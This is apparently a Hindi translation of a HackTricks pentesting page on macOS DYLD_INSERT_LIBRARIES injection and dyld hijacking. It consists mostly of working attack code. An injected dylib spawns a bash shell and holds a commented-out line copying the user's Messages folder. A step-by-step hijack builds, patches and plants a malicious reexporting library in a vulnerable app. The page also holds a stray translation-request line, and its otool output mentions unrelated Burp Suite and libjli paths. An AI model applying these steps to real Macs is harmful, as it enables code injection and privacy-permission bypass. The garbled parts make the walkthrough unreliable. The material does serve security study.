# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES

{{#include ../../../../banners/hacktricks-training.md}}

## DYLD_INSERT_LIBRARIES का Basic example

**Inject करने के लिए Library** ताकि shell execute हो:
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
//system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```
Attack करने वाला Binary:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
Injection:
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Dyld Hijacking Example

लक्षित vulnerable binary `/Applications/VulnDyld.app/Contents/Resources/lib/binary` है।

{{#tabs}}
{{#tab name="entitlements"}}

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>

{{#endtab}}

{{#tab name="LC_RPATH"}}
```bash
# Check where are the @rpath locations
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib2 (offset 12)
```
{{#endtab}}

{{#tab name="@rpath"}}
```bash
# Check librareis loaded using @rapth and the used versions
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
name @rpath/lib.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
# Check the versions
```
{{#endtab}}
{{#endtabs}}

पिछली जानकारी से हमें पता चलता है कि यह **loaded libraries के signature की जाँच नहीं कर रहा है** और यह **यहाँ से एक library load करने का प्रयास कर रहा है**:

- `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
- `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`

हालाँकि, पहली वाली मौजूद नहीं है:
```bash
pwd
/Applications/VulnDyld.app

find ./ -name lib.dylib
./Contents/Resources/lib2/lib.dylib
```
तो, इसे hijack करना संभव है! ऐसी library बनाएँ जो **कुछ arbitrary code execute करे और उसे reexport करके legit library जैसी ही functionalities export करे**। और इसे expected versions के साथ compile करना याद रखें:
```objectivec:lib.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s", argv[0]);
}
```
कृपया वह English content साझा करें जिसे Hindi में translate करना है।
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
# Note the versions and the reexport
```
library में बनाया गया reexport path loader के सापेक्ष है, इसे export की जाने वाली library के absolute path में बदलें:
```bash
#Check relative
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change the location of the library absolute to absolute path
install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib

# Check again
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
अंत में, इसे केवल **hijacked location** पर copy करें:
```bash
cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
```
और binary को **execute** करें और जांचें कि **library was loaded** है:

<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
</strong>Usage: [...]
</code></pre>

> [!TIP]
> इस vulnerability का abuse करके Telegram की camera permissions का abuse करने के तरीके पर एक अच्छा writeup [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup> पर पाया जा सकता है।

## बड़े स्तर पर

यदि आप unexpected binaries में libraries inject करने का प्रयास करना चाहते हैं, तो आप event messages को check करके पता लगा सकते हैं कि library किसी process के अंदर कब load होती है (इस स्थिति में `printf` और `/bin/bash` execution को हटा दें)।
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
## संदर्भ

- [1] [CVE-2023-26818 - macOS में Telegram के साथ TCC को bypass करना](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)

{{#include ../../../../banners/hacktricks-training.md}}
